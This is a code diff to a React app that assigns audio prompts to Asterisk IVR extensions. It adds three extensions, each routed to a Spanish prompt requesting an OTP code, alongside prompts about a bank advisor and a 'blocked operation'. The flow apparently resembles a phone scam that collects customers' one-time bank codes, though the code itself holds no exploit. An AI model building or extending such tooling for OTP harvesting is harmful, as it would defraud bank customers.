@@ -233,8 +233,11 @@ export default function App() {
     press1_welcome: 'custom/bienvenida_corporativa',
     agent_transfer: 'custom/conectar_asesor_banco',
     press1_invalid: 'custom/opcion_invalida',
-    welcome_7777: 'custom/solicitar_codigo_otp',
+    welcome_3333: 'custom/solicitar_codigo_otp',
+    welcome_4444: 'custom/solicitar_codigo_otp',
+    welcome_5555: 'custom/solicitar_codigo_otp',
     welcome_6666: 'custom/bienvenida_6666',
+    welcome_7777: 'custom/solicitar_codigo_otp',
     otp_welcome: 'custom/solicitar_codigo_otp',
     otp_wait: 'custom/un_momento_validando_informacion',
     otp_success: 'custom/operacion_bloqueada_exito',
@@ -704,6 +707,54 @@ export default function App() {
     }).catch(() => {});
   };
 
+  const handleAssignTo3333 = (audioId: string) => {
+    const audio = audios.find((a) => a.id === audioId);
+    if (!audio) return;
+    showToast(`Audio "${audio.name}" asignado a Bienvenida de Extensión 3333.`);
+    addLog(
+      'AMI',
+      `Bienvenida Extensión 3333 actualizada: ${audio.fileName}`,
+      `AstDB: database put ivr_vars 3333_intro "${audio.asteriskPath}"`
+    );
+    fetch('/api/asterisk/audio/assign', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ role: 'welcome_3333', asteriskPath: audio.asteriskPath }),
+    }).catch(() => {});
+  };
+
+  const handleAssignTo4444 = (audioId: string) => {
+    const audio = audios.find((a) => a.id === audioId);
+    if (!audio) return;
+    showToast(`Audio "${audio.name}" asignado a Bienvenida de Extensión 4444.`);
+    addLog(
+      'AMI',
+      `Bienvenida Extensión 4444 actualizada: ${audio.fileName}`,
+      `AstDB: database put ivr_vars 4444_intro "${audio.asteriskPath}"`
+    );
+    fetch('/api/asterisk/audio/assign', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ role: 'welcome_4444', asteriskPath: audio.asteriskPath }),
+    }).catch(() => {});
+  };
+
+  const handleAssignTo5555 = (audioId: string) => {
+    const audio = audios.find((a) => a.id === audioId);
+    if (!audio) return;
+    showToast(`Audio "${audio.name}" asignado a Bienvenida de Extensión 5555.`);
+    addLog(
+      'AMI',
+      `Bienvenida Extensión 5555 actualizada: ${audio.fileName}`,
+      `AstDB: database put ivr_vars 5555_intro "${audio.asteriskPath}"`
+    );
+    fetch('/api/asterisk/audio/assign', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ role: 'welcome_5555', asteriskPath: audio.asteriskPath }),
+    }).catch(() => {});
+  };
+
   const handleAssignTo6666 = (audioId: string) => {
     const audio = audios.find((a) => a.id === audioId);
     if (!audio) return;
@@ -1006,6 +1057,9 @@ export default function App() {
             onAssignToAgentTransfer={handleAssignToAgentTransfer}
             onAssignTo7777={handleAssignTo7777}
             onAssignTo6666={handleAssignTo6666}
+            onAssignTo5555={handleAssignTo5555}
+            onAssignTo4444={handleAssignTo4444}
+            onAssignTo3333={handleAssignTo3333}
             activeAssignments={activeAudioAssignments}
             onAssignRole={handleAssignRole}
           />
